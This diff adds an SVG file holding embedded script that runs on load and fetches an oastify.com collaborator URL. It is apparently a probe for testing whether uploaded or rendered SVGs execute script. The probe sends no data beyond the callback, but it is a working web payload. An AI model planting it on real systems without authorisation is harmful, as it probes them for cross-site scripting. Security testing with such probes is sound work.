@@ -1,0 +1,34 @@
+<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <rect width="100%" height="100%" fill="#f0f0f0"/>
+  
+  <text x="20" y="30" font-family="Arial" font-size="14" fill="black">
+    Collaborator Request Status: <tspan id="status" font-weight="bold">Loading...</tspan>
+  </text>
+
+  <script type="text/ecmascript">
+    <![CDATA[
+      // Replace this with your collaborator URL
+      const collaboratorUrl = 'http://qmgwe0jncyduxy147j5ufak78yep2hs5h.oastify.com';
+
+      async function requestCollaborator() {
+        try {
+          // Send a GET request to the collaborator URL
+          const response = await fetch(collaboratorUrl, {
+            method: 'GET',
+            mode: 'no-cors', // Use 'no-cors' to avoid CORS issues (but limits response access)
+          });
+
+          // Update the status in the SVG
+          document.getElementById('status').textContent = 'Request sent successfully!';
+        } catch (error) {
+          // Handle errors
+          document.getElementById('status').textContent = 'Error sending request.';
+          console.error('Error:', error);
+        }
+      }
+
+      // Execute the function
+      requestCollaborator();
+    ]]>
+  </script>
+</svg>
